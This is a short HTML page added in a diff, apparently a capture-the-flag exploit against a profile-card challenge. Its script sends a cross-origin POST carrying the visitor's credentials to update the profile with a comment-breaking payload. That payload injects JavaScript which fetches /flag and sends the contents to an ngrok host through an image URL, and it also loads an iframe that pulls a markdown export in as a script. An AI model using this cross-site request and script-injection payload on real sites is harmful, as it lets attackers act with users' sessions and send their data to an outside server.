@@ -1,0 +1,49 @@
+<!DOCTYPE html>
+
+<html lang="zh-tw">
+
+<head>
+    <!-- <meta name="referrer" content="no-referrer" /> -->
+    <!-- <meta charset="UTF-8"> -->
+    <!-- <meta name="viewport" content="width=device-width, initial-scale=1.0"> -->
+    <title>Profile Card</title>
+</head>
+
+<body>
+
+<script type="text/javascript">
+const url = "https://5d88-140-112-71-117.ngrok.io/";
+exploit_obj = {
+  avatar: "/* ",
+  title: "",
+  profile: `
+*/(function ff() {
+fetch("/flag")
+.then(r => r.text())
+.then(r => {
+console.log(r);
+var myimg = document.createElement("img");
+myimg.src = "${url}" + r;
+document.body.appendChild(myimg);
+})
+})()
+
+)]
+/*<iframe srcdoc="&lt;script src=&quot;/export?format=markdown&quot;&gt;&lt;/script&gt;"></iframe>*/
+`
+}
+fetch('https://profile.chal.h4ck3r.quest/api/update', {
+    method: 'POST',
+    body: JSON.stringify(exploit_obj),
+    credentials: 'include',
+    mode: "cors"
+})
+.catch((err) => {
+  console.log(err)
+  location.href = 'https://profile.chal.h4ck3r.quest'
+})
+
+</script>
+</body>
+
+</html>
